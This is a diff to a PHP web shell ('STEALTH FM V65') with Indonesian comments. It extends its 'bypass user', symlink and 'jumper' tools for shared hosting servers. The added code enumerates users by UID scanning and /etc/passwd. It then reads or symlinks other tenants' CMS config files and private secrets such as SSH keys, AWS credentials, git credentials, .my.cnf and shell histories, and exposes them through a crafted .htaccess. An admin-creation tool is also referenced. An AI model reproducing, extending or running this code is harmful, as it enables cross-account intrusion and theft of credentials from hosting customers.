@@ -1,3 +1,4 @@
+
 <?php
 // -------------------------------------------------------------------------
 // STEALTH FM V65 (ULTIMATE: JAILBREAK + ANTI-LOOP + HYBRID BYPASS)
@@ -514,14 +515,11 @@ if (isset($_SERVER[$h_act])) {
             exit;
         }
         
-        // --- BYPASS USER (CLEAN VERSION WITH FULL BLACKLIST) ---
+                // --- BYPASS USER (PRIORITY: ID SCANNING -> FALLBACK: ETC/PASSWD) ---
         if ($tool === 'bypass_user') {
             $found = [];
             
-            // Menggunakan x_read yang sudah di-update (Support Jailbreak)
-            $raw_etc = x_read("/etc/passwd");
-            
-            // Daftar user sampah (System Users) yang wajib dibuang
+            // Daftar user system/sampah yang wajib dibuang
             $blacklist = [
                 'root', 'bin', 'daemon', 'adm', 'lp', 'sync', 'shutdown', 'halt', 'mail', 
                 'operator', 'games', 'ftp', 'named', 'nscd', 'rpcuser', 'rpc', 'mailnull', 
@@ -531,63 +529,67 @@ if (isset($_SERVER[$h_act])) {
                 'cpanelphpmyadmin', 'cpanelphppgadmin', 'dovenull', 'mysql', 'cpses', 
                 'cpanelanalytics', 'cpanelconnecttrack', 'cpanelroundcube', 'cpaneleximscanner', 
                 'cpaneleximfilter', 'cpanellogin', 'cpanelcabcache', 'cpanel', 'mailman', 
-                'chrony', 'sssd', 'systemd-coredump', 'nobody', 'apache', 'nginx', 'litespeed'
+                'chrony', 'sssd', 'systemd-coredump', 'nobody', 'apache', 'nginx', 'litespeed',
+                'systemd-network', 'systemd-resolve', 'systemd-timesync'
             ];
 
-            // 1. Parsing dari /etc/passwd (Metode Utama)
-            if ($raw_etc) { 
-                $lines = explode("\n", $raw_etc); 
-                foreach($lines as $l) { 
-                    if(empty(trim($l))) continue;
-                    $p = explode(":", $l);
-                    $u = isset($p[0]) ? trim($p[0]) : '';
-                    $h = isset($p[5]) ? trim($p[5]) : ''; // Kolom ke-6 adalah Home Directory
-                    
-                    // FILTER CANGGIH:
-                    // 1. User tidak boleh ada di blacklist
-                    // 2. Home directory harus mengandung "home" atau "www" (Ciri user hosting)
-                    if (!empty($u) && !in_array($u, $blacklist)) {
-                        if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false || stripos($h, '/usr/home') !== false) {
-                            $found[] = $u;
-                        }
-                    }
-                } 
-            } 
-            
-            // 2. Fallback: Scanning ID (Jika /etc/passwd unreadable atau kosong)
-            if (empty($found)) { 
-                // Scan dari ID 500 sampai 5000 (User hosting biasanya ID-nya besar)
-                for ($userid = 500; $userid < 5000; $userid++) { 
-                    $arr = posix_getpwuid($userid); 
+            // METODE 1: SCANNING ID (PRIORITAS UTAMA)
+            // Mencoba mendapatkan user langsung dari Kernel via POSIX
+            // Range scan: 0 sampai 5000 (Mencakup user system & user hosting)
+            if (function_exists('posix_getpwuid')) {
+                for ($userid = 0; $userid < 5000; $userid++) { 
+                    $arr = @posix_getpwuid($userid); 
                     if (!empty($arr) && isset($arr['name'])) {
                         $u = $arr['name'];
-                        $h = $arr['dir'];
+                        $h = isset($arr['dir']) ? $arr['dir'] : '';
                         
+                        // Filter: Tidak boleh ada di blacklist DAN home dir harus valid
                         if (!in_array($u, $blacklist)) {
-                             // Terapkan filter home directory juga di sini
-                             if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false) {
+                             if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false || stripos($h, '/usr/home') !== false) {
                                 $found[] = $u;
                              }
                         }
                     } 
-                } 
+                }
+            }
+
+            // METODE 2: READ /ETC/PASSWD (FALLBACK)
+            // Hanya dijalankan jika Metode 1 (Scanning ID) gagal total atau return kosong
+            if (empty($found)) { 
+                $raw_etc = x_read("/etc/passwd");
+                if ($raw_etc) { 
+                    $lines = explode("\n", $raw_etc); 
+                    foreach($lines as $l) { 
+                        if(empty(trim($l))) continue;
+                        $p = explode(":", $l);
+                        $u = isset($p[0]) ? trim($p[0]) : '';
+                        $h = isset($p[5]) ? trim($p[5]) : ''; // Kolom 6 = Home Dir
+                        
+                        if (!empty($u) && !in_array($u, $blacklist)) {
+                            if (stripos($h, '/home') !== false || stripos($h, '/var/www') !== false || stripos($h, '/usr/home') !== false) {
+                                $found[] = $u;
+                            }
+                        }
+                    } 
+                }
             }
             
             // Hapus duplikat & Simpan
             $found = array_unique($found);
             $output = "";
             foreach($found as $user) {
-                $output .= $user . ":\n"; // Format user: (penting untuk Jumper Cage)
+                $output .= $user . ":\n"; 
             }
 
             if(!empty($output)) { 
                 x_write("passwd.txt", $output); 
-                echo "Saved to: passwd.txt\nClean Users Found: " . count($found); 
+                echo "Saved to: passwd.txt\nMethod: " . (function_exists('posix_getpwuid') ? "ID Scan (Primary)" : "File Read (Fallback)") . "\nClean Users Found: " . count($found); 
             } else {
-                echo "Failed. No valid hosting users found."; 
+                echo "Failed. No valid hosting users found via ID Scan or File Read."; 
             }
             exit;
         }
+
 
         if ($tool === 'add_admin') {
             $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
@@ -645,7 +647,7 @@ if (isset($_SERVER[$h_act])) {
             exit;
         }
 
-        // --- SMART JUMPER & SYMLINKER (CMS DETECTOR + ANTI-BRUTAL) ---
+        // --- SMART JUMPER & SYMLINKER (UNIVERSAL PATH: CPANEL + DIRECTADMIN) ---
         if ($tool === 'symlink_cage' || $tool === 'jumper_cage') {
             $c = x_read(getcwd()."/passwd.txt"); 
             if(!$c) { echo "Err: passwd.txt missing. Run 'Bypass User' first."; exit; }
@@ -655,16 +657,41 @@ if (isset($_SERVER[$h_act])) {
             if(!is_dir($dir)) @mkdir($dir, 0755); 
             @chdir($dir);
             
-            // Buat .htaccess agar file txt/symlink bisa dibuka/didownload di browser
             x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType text/plain .php\nAddHandler text/plain .php");
             
-            // Mapping File Config -> Nama CMS
+            // 1. CONFIG CMS (Updated List)
             $cms_map = [
-                'wp-config.php'     => 'wordpress',
-                'configuration.php' => 'joomla',
-                '.env'              => 'laravel',
-                'config.php'        => 'config',   // Generic
-                'Settings.php'      => 'settings'
+                'wp-config.php'             => 'wordpress',
+                '.env'                      => 'laravel_env',
+                'configuration.php'         => 'joomla_whmcs',
+                'sites/default/settings.php'=> 'drupal',
+                'app/etc/env.php'           => 'magento_env',
+                'app/etc/local.xml'         => 'magento_xml',
+                'app/config/parameters.php' => 'prestashop',
+                'config/settings.inc.php'   => 'prestashop_old',
+                'config.php'                => 'opencart',
+                'admin/config.php'          => 'opencart_admin',
+                'core/includes/config.php'  => 'vbulletin',
+                'includes/config.php'       => 'vbulletin_old',
+                'src/config.php'            => 'xenforo',
+                'library/config.php'        => 'xenforo_old',
+                'application/config/database.php' => 'codeigniter',
+                'typo3conf/LocalConfiguration.php' => 'typo3',
+                'wp/wp-config.php'              => 'wp',
+                'config/db.php'             => 'yii_db'
+            ];
+
+            // 2. FILE SENSITIF (Root Home)
+            $sensitive_map = [
+                '.my.cnf'           => 'cp',
+                '.accesshash'       => 'whm',
+                '.bash_history'     => 'bash_hist',
+                '.mysql_history'    => 'sql_hist',
+                '.ssh/id_rsa'       => 'ssh_rsa',
+                '.ssh/id_ed25519'   => 'ssh_ed25519',
+                '.ssh/known_hosts'  => 'ssh_hosts',
+                '.aws/credentials'  => 'aws_key',
+                '.git-credentials'  => 'git_key'
             ];
             
             $n = 0;
@@ -673,59 +700,94 @@ if (isset($_SERVER[$h_act])) {
                 $u = trim(explode(":", $u_str)[0]); 
                 if(!$u) continue;
                 
-                // 1. Loop Home Directory (/home, /home1, dst)
                 foreach ($home_dirs as $h) {
-                    $found_user = false; // Penanda "Stop at First Found"
-                    
-                    // 2. Loop Jenis CMS
-                    foreach ($cms_map as $file => $cms_name) {
-                        $target = "$h/$u/public_html/$file";
-                        
-                        // Nama file output rapi: user~home~cms.txt
-                        // Contoh: user~home~wordpress.txt
-                        $save_name = "$u~" . str_replace("/", "", $h) . "~$cms_name.txt";
-                        
-                        // --- LOGIKA JUMPER (BACA ISI) ---
+                    $home_root = "$h/$u";
+                    $found_cms = false;
+
+                    // --- [HELPER] STRICT CHECKER & SAVER ---
+                    $process_file = function($target_path, $save_name) use ($tool, &$n) {
                         if ($tool === 'jumper_cage') {
-                            $dat = x_read($target);
-                            // Validasi: Harus ada isinya & minimal 50 karakter
-                            if ($dat && strlen($dat) > 50) {
+                            $dat = x_read($target_path);
+                            // Validasi Ketat: Ada isi, bukan error
+                            if ($dat && strlen($dat) > 10 
+                                && stripos($dat, 'No such file') === false 
+                                && stripos($dat, 'Permission denied') === false 
+                                && stripos($dat, 'Unable to open') === false) {
+                                
                                 x_write($save_name, $dat);
+                                @chmod($save_name, 0644);
                                 $n++;
-                                $found_user = true;
-                                break; // STOP LOOP CONFIG (Sudah dapat CMS utama)
+                                return true;
                             }
-                        } 
-                        
-                        // --- LOGIKA SYMLINKER (SMART LINK) ---
-                        elseif ($tool === 'symlink_cage') {
-                            // Coba buat symlink
-                            if (file_exists($save_name)) @unlink($save_name); // Hapus sisa lama
-                            x_link($target, $save_name);
-                            
-                            // SMART CHECK: Cek apakah symlink berfungsi (targetnya ada)
-                            // Jika file_exists($link) bernilai true, berarti targetnya valid/ada.
-                            if (file_exists($save_name)) {
+                        } elseif ($tool === 'symlink_cage') {
+                            if (file_exists($save_name)) @unlink($save_name);
+                            x_link($target_path, $save_name);
+                            // Validasi Symlink: Coba baca sedikit
+                            $test_read = @file_get_contents($save_name, false, null, 0, 50);
+                            if ($test_read !== false && strlen($test_read) > 0 && stripos($test_read, 'Permission denied') === false) {
+                                @chmod($save_name, 0644);
                                 $n++;
-                                $found_user = true;
-                                break; // STOP LOOP CONFIG (Sudah dapat CMS utama)
+                                return true;
                             } else {
-                                // Jika symlink 'broken' (target tidak ada), hapus aja biar bersih
-                                @unlink($save_name);
+                                @unlink($save_name); // Hapus symlink mati
+                            }
+                        }
+                        return false;
+                    };
+
+                    // --- STEP A: CARI FILE SENSITIF (Di Root Home) ---
+                    foreach ($sensitive_map as $file => $out_name) {
+                        $process_file("$home_root/$file", "$u~" . str_replace("/", "", $h) . "~$out_name.txt");
+                    }
+
+                    // --- STEP B: DETEKSI DOCUMENT ROOTS (cPanel & DirectAdmin) ---
+                    $target_roots = [];
+                    
+                    // 1. Standar cPanel (/home/user/public_html)
+                    if (is_dir("$home_root/public_html")) {
+                        $target_roots[] = "$home_root/public_html";
+                    }
+                    
+                    // 2. DirectAdmin / Multi-Domain (/home/user/domains/domain.com/public_html)
+                    if (is_dir("$home_root/domains")) {
+                        $domains = @scandir("$home_root/domains");
+                        if ($domains) {
+                            foreach ($domains as $d) {
+                                if ($d === '.' || $d === '..' || !is_dir("$home_root/domains/$d")) continue;
+                                $da_path = "$home_root/domains/$d/public_html";
+                                if (is_dir($da_path)) {
+                                    $target_roots[] = $da_path;
+                                }
+                            }
+                        }
+                    }
+
+                    // --- STEP C: SCAN CONFIG DI SEMUA ROOT YANG DITEMUKAN ---
+                    foreach ($target_roots as $public_html) {
+                        if ($found_cms) break; // Smart Stop: Cukup 1 config valid per user
+
+                        foreach ($cms_map as $file => $cms_name) {
+                            $target = "$public_html/$file";
+                            $save_name = "$u~" . str_replace("/", "", $h) . "~$cms_name.txt";
+                            
+                            if ($process_file($target, $save_name)) {
+                                $found_cms = true;
+                                break; // Stop loop CMS
                             }
                         }
                     }
                     
-                    // SMART BREAK: 
-                    // Jika di direktori ini (misal /home) sudah ketemu CMS-nya,
-                    // JANGAN buang waktu scan /home1, /home2, dst. Lanjut user berikutnya.
-                    if ($found_user) break; 
+                    if ($found_cms) break; // Pindah ke user berikutnya
                 }
             }
             
-            echo "$tool Done. Total Valid ($tool): $n."; 
+            echo "$tool Done. Total Valid & Readable Files: $n."; 
             exit;
         }
+
+
+
+
         
         // --- BACKUP (UAPI TOKEN + CREATE ADMIN) ---
         if ($tool === 'backup') {
